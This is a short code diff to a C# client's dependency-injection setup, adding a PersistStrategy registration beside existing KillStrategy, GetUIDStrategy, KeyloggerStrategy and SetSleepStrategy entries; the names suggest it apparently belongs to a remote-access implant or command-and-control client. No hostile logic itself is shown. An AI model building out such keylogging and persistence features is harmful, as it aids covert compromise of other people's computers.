@@ -104,6 +104,7 @@ namespace Client
             builder.Services.AddScoped<KillStrategy>();
             builder.Services.AddScoped<GetUIDStrategy>();
             builder.Services.AddScoped<KeyloggerStrategy>();
+            builder.Services.AddScoped<PersistStrategy>();
             builder.Services.AddScoped<SetSleepStrategy>();
             builder.Services.AddScoped<HelpStrategy>();
 
